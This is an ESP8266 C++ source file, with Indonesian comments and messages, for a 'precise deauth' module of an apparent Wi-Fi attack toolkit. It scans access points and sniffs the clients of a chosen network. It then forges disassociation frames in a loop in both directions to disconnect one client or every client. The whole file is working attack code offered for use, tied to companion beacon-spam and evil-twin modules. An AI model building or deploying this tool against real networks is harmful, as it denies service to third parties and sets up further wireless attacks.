#include "pdeauth.h"
#include "sniffer.h"
#include "cli.h"
#include "beacon.h"
#include "deauth.h"
#include "evil.h"
#include <ESP8266WiFi.h>
#include <string.h>

extern "C" {
  #include "user_interface.h"
  int wifi_send_pkt_freedom(uint8_t* buf, int len, bool sys_seq);
}

#define PD_MAX_AP  24
#define PD_MAX_CLI 32

struct scan_entry { uint8_t bssid[6]; uint8_t channel; int8_t rssi; char ssid[33]; };
static scan_entry s_scan[PD_MAX_AP];
static uint8_t    s_scanN = 0;

struct pd_cli { uint8_t mac[6]; int8_t rssi; uint32_t last; uint32_t pkts; };
static pd_cli  s_cli[PD_MAX_CLI];
static uint8_t s_cliN = 0;

static uint8_t  s_bssid[6];
static uint8_t  s_ch = 1;
static char     s_ssid[33] = {0};

static bool     s_collecting = false;
static bool     s_attacking  = false;
static volatile bool s_lock  = false;
static int      s_targetIdx  = -1;          // -1 = semua client
static uint32_t s_sent = 0, s_fail = 0;
static uint32_t s_lastShow = 0, s_lastStat = 0;
static uint8_t  s_pkt[64];

static void nullcb(uint8_t*, uint16_t) {}

static inline bool mac_eq(const uint8_t* a, const uint8_t* b) { return memcmp(a, b, 6) == 0; }
static inline bool mac_group(const uint8_t* m) { return (m[0] & 0x01) != 0; }
static inline bool mac_zero(const uint8_t* m) { for (int i=0;i<6;i++) if (m[i]) return false; return true; }

// deauth/disassoc dengan 3 alamat bebas (untuk unicast 2-arah)
static int build_deauth(uint8_t* p, const uint8_t* a1, const uint8_t* a2,
                        const uint8_t* a3, uint8_t subtype, uint8_t reason) {
  int i = 0;
  p[i++] = (uint8_t)(subtype << 4); p[i++] = 0x00;
  p[i++] = 0x00; p[i++] = 0x00;
  for (int j=0;j<6;j++) p[i++] = a1[j];
  for (int j=0;j<6;j++) p[i++] = a2[j];
  for (int j=0;j<6;j++) p[i++] = a3[j];
  p[i++] = 0x00; p[i++] = 0x00;
  p[i++] = reason; p[i++] = 0x00;
  return i;
}

static void send_pair(const uint8_t* client) {
  int len;
  len = build_deauth(s_pkt, client, s_bssid, s_bssid, 12, 1);   // AP -> client
  if (wifi_send_pkt_freedom(s_pkt, len, 0) == 0) s_sent++; else s_fail++;
  delay(1);
  len = build_deauth(s_pkt, s_bssid, client, s_bssid, 12, 1);   // client -> AP
  if (wifi_send_pkt_freedom(s_pkt, len, 0) == 0) s_sent++; else s_fail++;
  delay(1);
}

// --------------------------------------------------- collect handler -------
static void client_record(const uint8_t* m, int8_t rssi, uint32_t now) {
  for (uint8_t i=0;i<s_cliN;i++) if (mac_eq(s_cli[i].mac, m)) {
    s_cli[i].rssi=rssi; s_cli[i].last=now; s_cli[i].pkts++; return;
  }
  if (s_cliN >= PD_MAX_CLI) return;
  uint8_t i=s_cliN++; memcpy(s_cli[i].mac,m,6); s_cli[i].rssi=rssi; s_cli[i].last=now; s_cli[i].pkts=1;
}

static void pd_handler(const nc_frame* f) {
  if (!s_collecting || s_lock) return;
  if (f->type != 2) return;                                     // data
  const uint8_t* ap=nullptr; const uint8_t* cli=nullptr;
  if (f->from_ds && !f->to_ds)      { ap=f->addr2; cli=f->addr1; }
  else if (f->to_ds && !f->from_ds) { ap=f->addr1; cli=f->addr2; }
  else return;
  if (!mac_eq(ap, s_bssid)) return;                             // hanya AP target
  if (mac_group(cli) || mac_zero(cli)) return;
  client_record(cli, f->rssi, millis());
}

// ------------------------------------------------------------- lifecycle ---
void pdeauth_stop() {
  bool was = s_collecting || s_attacking;
  if (s_attacking) { wifi_promiscuous_enable(0); }
  if (s_collecting && sniffer_running()) sniffer_stop();
  if (s_attacking)
    Serial.printf("[pdeauth] STOP — sukses=%lu gagal=%lu\n",
                  (unsigned long)s_sent, (unsigned long)s_fail);
  s_collecting = false;
  s_attacking  = false;
  (void)was;
}

static void begin_attack() {
  s_collecting = false;
  if (sniffer_running()) sniffer_stop();
  wifi_set_opmode_current(STATION_MODE);
  wifi_set_promiscuous_rx_cb(nullcb);
  wifi_promiscuous_enable(1);
  wifi_set_channel(s_ch);
  s_attacking = true;
  s_sent = s_fail = 0;
  s_lastStat = millis();
  if (s_targetIdx >= 0)
    Serial.printf("[pdeauth] DEAUTH client %s di AP %s ch%d\n",
      nc_mac_str(s_cli[s_targetIdx].mac), nc_mac_str(s_bssid), s_ch);
  else
    Serial.printf("[pdeauth] DEAUTH SEMUA %u client di AP %s ch%d\n",
      s_cliN, nc_mac_str(s_bssid), s_ch);
}

void pdeauth_loop() {
  uint32_t now = millis();

  if (s_collecting && (now - s_lastShow) >= 2000) {
    s_lastShow = now;
    s_lock = true;
    Serial.printf("[pdeauth] client AP %s ch%d — %u terlihat:\n",
                  nc_mac_str(s_bssid), s_ch, s_cliN);
    for (uint8_t i=0;i<s_cliN;i++)
      Serial.printf("   %u) %s  %4ddBm  pkts=%lu  age=%lus\n",
        i, nc_mac_str(s_cli[i].mac), s_cli[i].rssi,
        (unsigned long)s_cli[i].pkts, (unsigned long)((now - s_cli[i].last)/1000));
    if (s_cliN == 0) Serial.println(F("   (belum ada — pancing trafik di client target)"));
    Serial.println(F("   nomor=deauth client itu | 'a'=semua | 'r'=reset | 'q'=batal"));
    s_lock = false;
    return;
  }

  if (s_attacking) {
    wifi_set_channel(s_ch);
    if (s_targetIdx >= 0 && s_targetIdx < (int)s_cliN) send_pair(s_cli[s_targetIdx].mac);
    else if (s_targetIdx < 0) for (uint8_t i=0;i<s_cliN;i++) send_pair(s_cli[i].mac);

    if (now - s_lastStat >= 2000) {
      s_lastStat = now;
      if (s_targetIdx >= 0)
        Serial.printf("[pdeauth] -> %s : sukses=%lu gagal=%lu\n",
          nc_mac_str(s_cli[s_targetIdx].mac), (unsigned long)s_sent, (unsigned long)s_fail);
      else
        Serial.printf("[pdeauth] -> %u client : sukses=%lu gagal=%lu\n",
          s_cliN, (unsigned long)s_sent, (unsigned long)s_fail);
    }
  }
}

// ------------------------------------------------- pilih client ------------
static void on_client_select(const char* line) {
  char c = line[0];
  if (c == 'q' || c == 'Q') { pdeauth_stop(); Serial.println(F("[pdeauth] batal")); cli_release(); return; }
  if (c == 'r' || c == 'R') { s_lock=true; s_cliN=0; s_lock=false; Serial.println(F("[pdeauth] daftar client direset")); return; }
  if (c == 'a' || c == 'A') {
    if (s_cliN == 0) { Serial.println(F("[pdeauth] belum ada client")); return; }
    s_targetIdx = -1; begin_attack(); cli_release(); return;
  }
  if (c == '\0') return;
  int idx = atoi(line);
  if (idx < 0 || idx >= (int)s_cliN) {
    Serial.printf("nomor tidak valid (0-%u), 'a', 'r', atau 'q'\n", s_cliN ? s_cliN-1 : 0);
    return;
  }
  s_targetIdx = idx; begin_attack(); cli_release();
}

static void on_ap_select(const char* line) {
  if (line[0] == 'q' || line[0] == 'Q' || line[0] == '\0') {
    Serial.println(F("[pdeauth] dibatalkan")); cli_release(); return;
  }
  int idx = atoi(line);
  if (idx < 0 || idx >= (int)s_scanN) {
    Serial.printf("nomor tidak valid (0-%u). coba lagi atau 'q'\n", s_scanN ? s_scanN-1 : 0);
    return;
  }
  pdeauth_collect_on(s_scan[idx].bssid, s_scan[idx].channel, s_scan[idx].ssid);
  cli_capture(on_client_select, "client#> ");
}

// programatik (UI) ----------------------------------------------------------
void pdeauth_collect_on(const uint8_t* bssid, uint8_t ch, const char* ssid) {
  beacon_stop(); deauth_stop(); evil_stop();
  memcpy(s_bssid, bssid, 6);
  s_ch = ch;
  strncpy(s_ssid, ssid, sizeof(s_ssid)); s_ssid[sizeof(s_ssid)-1]=0;

  s_lock=true; s_cliN=0; s_lock=false;
  s_collecting = true;
  if (sniffer_running()) sniffer_stop();
  sniffer_start();
  sniffer_set_hop(false);
  sniffer_set_channel(s_ch);
  sniffer_set_verbose(false);
  s_lastShow = millis();
  Serial.printf("[pdeauth] AP %s (%s) ch%d — mengumpulkan client...\n",
    s_ssid[0]?s_ssid:"<hidden>", nc_mac_str(s_bssid), s_ch);
}

int  pdeauth_client_count()        { return s_cliN; }
const char* pdeauth_client_mac(int i) { return (i>=0 && i<(int)s_cliN) ? nc_mac_str(s_cli[i].mac) : "?"; }
int8_t pdeauth_client_rssi(int i)  { return (i>=0 && i<(int)s_cliN) ? s_cli[i].rssi : 0; }
void pdeauth_attack_index(int idx) { if (idx<0 || idx>=(int)s_cliN) return; s_targetIdx=idx; begin_attack(); }
void pdeauth_attack_all()          { if (s_cliN==0) return; s_targetIdx=-1; begin_attack(); }
bool pdeauth_collecting()          { return s_collecting; }
bool pdeauth_attacking()           { return s_attacking; }
void pdeauth_stats(uint32_t* sent, uint32_t* fail) { if (sent) *sent=s_sent; if (fail) *fail=s_fail; }

static void cmd_pdeauth(int argc, char** argv) {
  if (argc >= 2 && strcasecmp(argv[1], "stop") == 0) {
    pdeauth_stop(); Serial.println(F("[pdeauth] berhenti")); return;
  }

  beacon_stop(); deauth_stop(); evil_stop();
  if (sniffer_running()) sniffer_stop();
  Serial.println(F("[pdeauth] memindai AP..."));
  int n = WiFi.scanNetworks(false, true);
  s_scanN = 0;
  for (int i=0;i<n && s_scanN<PD_MAX_AP;i++) {
    memcpy(s_scan[s_scanN].bssid, WiFi.BSSID(i), 6);
    s_scan[s_scanN].channel = (uint8_t)WiFi.channel(i);
    s_scan[s_scanN].rssi    = (int8_t)WiFi.RSSI(i);
    strncpy(s_scan[s_scanN].ssid, WiFi.SSID(i).c_str(), 32);
    s_scan[s_scanN].ssid[32] = 0;
    s_scanN++;
  }
  WiFi.scanDelete();
  if (s_scanN == 0) { Serial.println(F("[pdeauth] tidak ada AP")); return; }

  Serial.println(F("=== pilih AP untuk PRECISE DEAUTH ==="));
  for (uint8_t i=0;i<s_scanN;i++)
    Serial.printf("  %u) ch%-2d %4ddBm  %s  %s\n",
      i, s_scan[i].channel, s_scan[i].rssi, nc_mac_str(s_scan[i].bssid),
      s_scan[i].ssid[0] ? s_scan[i].ssid : "<hidden>");
  Serial.println(F("ketik nomor AP (atau 'q' batal):"));
  cli_capture(on_ap_select, "pdeauth AP#> ");
}

void pdeauth_init() {
  sniffer_add_handler(pd_handler);
  cli_register("pdeauth", "precise deauth per-client (pdeauth | pdeauth stop)", cmd_pdeauth);
}
